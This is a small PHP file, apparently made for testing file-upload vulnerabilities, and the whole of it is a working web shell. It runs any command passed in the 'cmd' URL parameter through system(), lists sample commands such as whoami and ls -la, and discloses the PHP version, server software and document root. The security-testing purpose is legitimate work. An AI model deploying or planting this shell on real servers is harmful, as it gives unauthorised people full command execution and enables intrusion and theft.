<?php
// Simple PHP Web Shell for Testing File Upload Vulnerability
// WARNING: This is for educational purposes only!

echo "<h2>🚨 File Upload Vulnerability Test - PHP Web Shell</h2>";
echo "<p><strong>This file should NOT be uploadable in a secure application!</strong></p>";

if (isset($_GET['cmd'])) {
    echo "<h3>Command Output:</h3>";
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "<h3>Usage:</h3>";
    echo "<p>Add <code>?cmd=COMMAND</code> to the URL to execute system commands.</p>";
    echo "<p>Examples:</p>";
    echo "<ul>";
    echo "<li><a href='?cmd=whoami'>?cmd=whoami</a></li>";
    echo "<li><a href='?cmd=pwd'>?cmd=pwd</a></li>";
    echo "<li><a href='?cmd=ls -la'>?cmd=ls -la</a></li>";
    echo "<li><a href='?cmd=php -v'>?cmd=php -v</a></li>";
    echo "</ul>";
}

echo "<hr>";
echo "<p><strong>Server Info:</strong></p>";
echo "<ul>";
echo "<li>PHP Version: " . phpversion() . "</li>";
echo "<li>Server: " . $_SERVER['SERVER_SOFTWARE'] . "</li>";
echo "<li>Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "</li>";
echo "<li>Current File: " . __FILE__ . "</li>";
echo "</ul>";
?>
